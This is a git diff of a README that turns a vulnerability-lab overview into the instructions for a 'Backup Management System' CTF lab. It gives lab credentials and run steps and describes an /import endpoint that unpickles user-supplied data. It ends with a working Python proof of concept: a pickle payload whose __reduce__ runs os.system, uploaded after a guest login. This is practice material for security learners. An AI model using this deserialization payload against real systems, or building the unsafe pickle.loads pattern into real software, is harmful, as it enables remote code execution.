@@ -1,56 +1,68 @@
-# 🧪 Z-Vuln-Lab — Vulnerability Practice Labs
+# Backup Management System – CTF Lab
 
-Z-Vuln-Lab is a hands-on web security lab series designed to help learners practice real-world vulnerabilities such as authentication bypass, SSTI, privilege escalation, and middleware flaws. Each vulnerability is isolated into its own Git branch.
+## Folder Structure
 
----
+```
+backend/
+├── app.py
+├── requirements.txt
+├── Dockerfile
+├── docker-compose.yml
+├── .env
+├── templates/
+│   ├── login.html
+│   └── dashboard.html
+└── utils/
+    ├── __init__.py
+    ├── auth.py
+    └── session.py
+```
 
+## Credentials
 
-## 📁 Project Structure
+| User  | Password          |
+|-------|-------------------|
+| admin | Adm1n@Backup2024! |
+| guest | guest             |
 
-Each lab exists in a separate branch:
+## Run Instructions
 
-- 🔥 **HTTP Request Smuggling**  
-  Branch: `http-smuggling-v5`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/http-smuggling-v5
-
-- 🔐 **JWT Auth Bypass (OAuth)**  
-  Branch: `jwt-oauth`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/jwt-oauth
-
-- 🧗 **Privilege Escalation**  
-  Branch: `privesc-v3`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/privesc-v3
-
-- 🧱 **Middleware Vulnerabilities**  
-  Branch: `middleware-v2`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/middleware-v2
-
-- 🧬 **Server-Side Template Injection (SSTI)**  
-  Branch: `ssti-v1`  
-  https://github.com/Zwique/Z_Vuln_Lab/tree/ssti-v1
-
----
-
-## 🏷️ Tags & Releases
-
-
-
-- 🔐 **v4.0-jwt-oauth**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v4.0-jwt-oauth
-
-- 🧗 **v3.0-privesc**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v3.0-privesc
-
-- 🧱 **v2.0-middleware**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v2.0-middleware
-
-- 🧬 **v1.0-ssti**  
-  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v1.0-ssti
----
-
-## 🚀 How to Use
+### Option A – Docker Compose (recommended)
 
 ```bash
-git clone https://github.com/Zwique/Z_Vuln_Lab.git
-cd Z_Vuln_Lab
-git checkout jwt-oauth
+sudo docker compose up --build
+```
+
+App available at: http://localhost:9000
+
+### Option B – Local
+
+```bash
+cd backend
+pip install -r requirements.txt
+# start redis locally first
+redis-server &
+python app.py
+```
+
+---
+
+## Vulnerability
+
+The `/import` endpoint passes user-controlled bytes directly to `pickle.loads()` after base64 decoding.
+
+### Exploit PoC (Python)
+
+```python
+import pickle, base64, os, requests
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ("id > /tmp/pwned",))
+
+payload = base64.b64encode(pickle.dumps(Exploit()))
+
+s = requests.Session()
+s.post("http://localhost:9000/login", data={"username": "guest", "password": "guest"})
+s.post("http://localhost:9000/import", files={"session_file": ("evil.bak", payload)})
+```
